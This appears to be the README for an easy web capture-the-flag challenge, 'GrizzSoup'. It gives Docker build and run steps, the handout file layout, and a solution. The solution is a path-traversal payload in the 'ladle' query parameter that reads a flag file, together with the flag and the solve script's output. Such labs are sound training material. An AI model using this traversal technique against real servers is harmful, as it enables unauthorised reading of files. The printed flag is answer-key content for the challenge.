# GrizzSoup

- **Author**: [supasuge](https://github.com/supasuge) | Evan Pardon
- **Catgegory**: Web
- **Difficulty**: Easy

## Build/Running the challenge

**Build**

```bash
# cd to src, which contains the Dockerfile + application code
cd GrizzSoup/src
# build challenge
docker build -t grizz-soup .
```

- Exposes port `1337`

**Run**

```bash
docker run -d -p 1337:1337 grizz-soup:latest
```

## Handout

```bash
handout/grizz-soup.tar.xz
# To extract contents:
tar -xJf grizz-soup.tar.xz
```

**Contents**:

```bash
├── app.py
├── Dockerfile
├── requirements.txt
├── scrolls
│   ├── chef
│   │   └── notes.md
│   └── classic
│       ├── soup_001.md
│       ├── soup_002.md
│       └── soup_003.md
├── scrolls_evil
│   └── flag.txt           # This has been replaced with an example flag for the handout.
├── static
│   ├── bear.jpg
│   ├── favicon.ico
│   └── style.css
└── templates
    ├── base.html
    ├── error.html
    ├── health.html
    ├── index.html
    └── slurp.html
```

## Solution

```bash
curl -sS 'http://127.0.0.1:1337/slurp?ladle=classic/../../scrolls_evil/flag.txt' | grep -oE 'GRIZZ\{[^}]+\}'

GRIZZ{21urp_d032nt_s4n1t1z3_g00d_j06}
```

Or using the Python script located at `solution/solve.py`

```bash
python solution/solve.py http://127.0.0.1:1337/

[*] GET http://127.0.0.1:1337/slurp?ladle=classic%2F..%2F..%2Fscrolls_evil%2Fflag.txt
[*] Status: 200
[+] Flag: GRIZZ{21urp_d032nt_s4n1t1z3_g00d_j06}
```

